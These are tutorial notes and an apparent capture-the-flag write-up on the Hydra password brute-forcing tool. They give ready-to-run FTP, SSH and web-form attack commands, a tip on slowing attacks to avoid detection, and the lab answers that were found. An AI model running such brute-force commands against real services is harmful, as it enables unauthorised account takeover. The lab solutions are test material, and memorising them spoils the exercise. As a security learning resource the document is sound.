
# Hydra - Password Cracking Tool

## 🔹 What is Hydra?
- Hydra is a **password cracking tool**.
- It is used to **brute force login credentials** on different services (like SSH, FTP, HTTP, etc.).
- Brute force means: **trying many passwords automatically until the correct one is found**.

👉 Example:
Imagine you are trying to log in to a website.
- Username = "admin"
- Password? You don't know...
- Manually, you will try: `1234`, `admin123`, `password`, `qwerty` ... (slow work 😓)
- Hydra does this automatically using a **password list (wordlist)** and checks super fast ⚡.



## 🔹 Why is Hydra Important?
- Many applications/devices come with **default weak passwords**.
- Example:  
  CCTV cameras often use → `admin:password`  
  Web frameworks sometimes → `admin:admin`
- If passwords are weak, Hydra can easily crack them.

👉 Lesson: Always use **strong, long, complex passwords**.



## 🔹 Protocols Supported by Hydra
Hydra can brute force on many services. Here are some important ones:

| Service / Protocol | Example Use Case |
|---------------------|------------------|
| **SSH**             | Remote server login |
| **FTP**             | File Transfer Protocol login |
| **HTTP/HTTPS**      | Website login forms |
| **SMTP/POP3/IMAP**  | Email accounts |
| **MySQL / MSSQL / Oracle / PostgreSQL** | Database logins |
| **RDP**             | Windows Remote Desktop login |
| **Telnet**          | Old remote login systems |
| **VNC**             | Remote desktop connection |
| **SNMP**            | Network device management |

👉 Hydra supports **dozens more**, like LDAP, MongoDB, SMB, XMPP, etc.



## 🔹 How to Install Hydra?
### Already Pre-installed:
- In **Kali Linux** (AttackBox, TryHackMe, or any Kali setup).

### If not installed:
- On **Ubuntu/Debian**:
```
apt install hydra
```
- On **Fedora**:
```
dnf install hydra
```
- From **Official GitHub Repository**:  
[https://github.com/vanhauser-thc/thc-hydra](https://github.com/vanhauser-thc/thc-hydra)



## 🔹 Why Password Strength Matters?
Hydra shows us the importance of a strong password:
- If password = `123456`, `admin`, `password`, → Hydra will break it **quickly**.
- If password = `T!g3r$2025#Secure`, → Hydra will take **much longer** (or maybe impossible with normal lists).

👉 **Tips for Strong Passwords**:
- Length ≥ 12 characters
- Mix: uppercase, lowercase, numbers, symbols
- Avoid common words/names/birthdays



## 🔹 Simple Analogy
Think of Hydra like:
- 🔑 A thief with a huge **keyring** of millions of keys.
- 🚪 The login system is the **door**.
- Hydra tries each key **automatically** until the door opens.

If your lock (password) is weak → it opens quickly.  
If your lock is strong → thief gets tired and gives up 😎.


---
# Hydra Commands 

## 🔹 General Command Format
Hydra basic command structure looks like this:

hydra [options] [target] [protocol]



## 🔹 Example 1: FTP Brute Force
```
hydra -l user -P passlist.txt ftp://10.201.1.164
```
- `-l user` → sets username as `user`
- `-P passlist.txt` → uses a wordlist of passwords
- `ftp://10.201.1.164` → target service and IP

👉 Hydra will try each password from `passlist.txt` for username `user` on FTP.



## 🔹 Example 2: SSH Brute Force
```
hydra -l root -P passwords.txt 10.201.1.164 -t 4 ssh
```
| Option | Meaning |
|--------|---------|
| `-l root` | username is `root` |
| `-P passwords.txt` | password list to try |
| `10.201.1.164` | target machine IP |
| `-t 4` | use 4 parallel threads (faster) |
| `ssh` | protocol (SSH login) |

👉 Hydra will test all passwords from `passwords.txt` with username `root` over SSH.  
👉 Multiple threads = faster cracking.



## 🔹 Example 3: Web Form (POST Method)
Hydra can also brute force web forms.

### Command:
```
hydra -l <username> -P <wordlist> 10.201.1.164 http-post-form "<path>:<login_credentials>:<invalid_response>"
```
### Options Explained:
| Option | Meaning |
|--------|----------|
| `-l <username>` | fixed username |
| `-P <wordlist>` | list of passwords |
| `http-post-form` | tells Hydra we are attacking a POST login form |
| `<path>` | login page (e.g., `/login.php`) |
| `<login_credentials>` | format → `username=^USER^&password=^PASS^` |
| `<invalid_response>` | string shown on failed login (e.g., "incorrect") |
| `-V` | verbose → shows every attempt |


## 🔹 Concrete Example
```
hydra -l admin -P rockyou.txt 10.201.1.164 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V
```
### Breakdown:
- `-l admin` → username is `admin`
- `-P rockyou.txt` → common password wordlist
- `10.201.1.164` → target IP
- `http-post-form` → we are attacking a POST form
- `/:username=^USER^&password=^PASS^:F=incorrect`
  - `/` → login page is just the root `/`
  - `username=^USER^` → Hydra replaces `^USER^` with `admin`
  - `password=^PASS^` → Hydra replaces `^PASS^` with passwords from list
  - `F=incorrect` → if "incorrect" is found in response → login failed
- `-V` → show detailed attempt logs

👉 Hydra will try to login at `http://10.201.1.164/` with username `admin` and every password in `rockyou.txt`.  
👉 If the response **does not contain "incorrect"**, that means **login successful! ✅**



## 🔹 Quick Comparison

| Protocol | Example Hydra Command |
|----------|------------------------|
| **FTP** | `hydra -l user -P passlist.txt ftp://10.201.1.164` |
| **SSH** | `hydra -l root -P passwords.txt 10.201.1.164 -t 4 ssh` |
| **Web Form (POST)** | `hydra -l admin -P rockyou.txt 10.201.1.164 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V` |



## 🔹 Summary
- Hydra works differently depending on **protocol** (SSH, FTP, Web Form, etc.).
- Always need:
  - Username (`-l`)
  - Password list (`-P`)
  - Target IP
  - Protocol (ssh, ftp, http-post-form, etc.)
- Extra options (`-t`, `-V`) make it faster or more detailed.

---
# Hydra Task

## 🔹 What is Hydra?
Hydra is a very powerful password-cracking tool used to brute force login services (like SSH, HTTP, FTP, etc.).  
It works by trying multiple username-password combinations until it finds the correct one.


## 🔹 Hydra Command Syntax
```
hydra -l <username> -P <wordlist> <target> <protocol> [options]
```
- `-l <username>` → set the username  
- `-P <wordlist>` → set the password wordlist  
- `<target>` → the target IP or domain  
- `<protocol>` → service to brute force (ssh, ftp, http-post-form, etc.)  
- `-t` → number of parallel tasks (default 16, but you can reduce to avoid detection)  
- `-vV` → verbose mode, shows all attempts  



## 🔹 Example 1: Brute Force Web Login (HTTP POST Form)
```
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.201.1.164 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
```
### Explanation:
- `/login` → the login page path  
- `username=^USER^&password=^PASS^` → tells Hydra where to place usernames and passwords  
- `F=incorrect` → failure message seen when login fails  
- This command found:  
  - Username: `molly`  
  - Password: `sunshine`  

👉 Login to the website using `molly : sunshine` → **Flag 1**



## 🔹 Example 2: Brute Force SSH Login
```
hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://10.201.1.164 -t 4
```
### Explanation:
- `ssh://10.201.1.164` → tells Hydra to attack SSH service on target  
- `-t 4` → run 4 tasks in parallel  
- This command found:  
  - Username: `molly`  
  - Password: `butterfly`  

👉 SSH login using:
```
ssh molly@10.201.1.164
```
Password: `butterfly` → **Flag 2**



## 🔹 Summary of Findings
- **Web Password** → `sunshine` → gave **Flag 1**  
- **SSH Password** → `butterfly` → gave **Flag 2**
